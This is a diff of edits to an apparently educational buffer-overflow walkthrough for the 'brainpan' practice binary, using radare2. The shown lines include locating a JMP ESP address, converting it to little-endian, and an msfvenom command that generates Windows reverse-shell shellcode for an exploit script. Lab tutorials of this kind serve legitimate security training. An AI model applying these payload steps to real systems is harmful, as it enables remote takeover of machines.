@@ -11,7 +11,7 @@ A hopefully helpful handbook for performing buffer overflows from the command li
 
 ####         The radare2 prompts you with your current memory location at all times. This means you can easily see what EIP was holding when the program crashes. Using `V` will enter visual mode, while `p` will cycle perspectives.
 
-####         The `is` command lists all the symbols in the binary. You'll need to have run analysis on the binary already.
+####         The `is` command lists all the symbols in the binary. You'll need to have run analysis on the binary already (`aaa` while in radare2 if you don't use the `-A` flag on startup).
 
 ____________________________________________________________________________________________
 
@@ -55,7 +55,7 @@ In your Windows VM, open up a second cmd terminal aside from the one brainpan is
 
 ![rad1](https://user-images.githubusercontent.com/5056836/121239756-e33b7780-c856-11eb-932d-f76177bdfc54.PNG)
 
-You'll get some analysis output, followed by a command prompt, which is the bottom line in yellow. The hex address shown is the current address in memory. From this prompt, run `2dc` to un-pause the debugger 2 times (radare2 appears to pause brainpan's execution whenever a new thread is launched, and this command un-pauses it so that we can debug in real time). 
+You'll get some analysis output, followed by a command prompt, which is the bottom line in yellow. The hex address shown (`0x774729dc`) is the current address in memory. From this prompt, run `2dc` to un-pause the debugger 2 times (radare2 appears to pause brainpan's execution whenever a new thread is launched, and this command un-pauses it so that we can debug in real time). 
 
 It will say "Finished thread", at which point you can hit enter again and get back to the yellow radare2 prompt. I noticed that sometimes I had to do `dc` more than twice, sometimes up to 4 times. Just do `dc` until you see "Finished thread" on the console. Then, brainpan should be listening. Note: further down, you may have to `dc` radare2 again once you've sent some input over the wire, so that brainpan can unpause and receive it.
 
@@ -202,7 +202,7 @@ If your screen changes when you press `Enter` but it doesn't look like this scre
 
 In the screenshot above, I've pointed out the columns of one instruction in particular. The right column shows the assembly instruction, `jmp esp`. This is the assembly instruction we've been searching for an exploitable intance of. The middle column shows the hexidecimal translation of that assembly instruction, `ffe4`. And the left column is, of course, the memory address where the instruction resides, `0x311712f3`.
 
-(At some point, I hope to come back to this section with a little more detail regarding how to choose this JMP ESP. This is the step mona.py usually handles.)
+(At some point, I want to come back to this section with a little more detail regarding how to choose this JMP ESP. This is the step mona.py usually handles.)
 
 Since our binary is 32-bit, it will use little-endian notation. So, we'll write each hex character in our new JMP ESP address in reverse, so that the instruction gets interpreted properly: `\xf3\x12\x17\x31`. We'll need this address shortly.
 
@@ -232,9 +232,9 @@ In our Linux VM, we'll run the following, substituting our Windows IP in:
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_WINDOWS_VM_IP> LPORT=4444 -a x86 -b "\x00" -f python`
 
-This will output a long string of hex characters. Copy this string to your clipboard.
+This will output a long, multi-line string of shellcode characters called "buf". Copy this entire string to your clipboard.
 
-![ms](https://user-images.githubusercontent.com/5056836/121802944-4c770e00-cbfc-11eb-8acb-da6565991efd.PNG)
+![msf](https://user-images.githubusercontent.com/5056836/121814283-5f560680-cc2d-11eb-8d1c-70e1b1d87302.PNG)
 
 Open `brainpan5.py` in a text editor and replace the "buf" lines in this script with the ones in your clipboard, so that the shellcode contains the right IP and port number. Note that `brainpan4.py` is for Windows attack machines, so we're using `brainpan5.py` here.
 
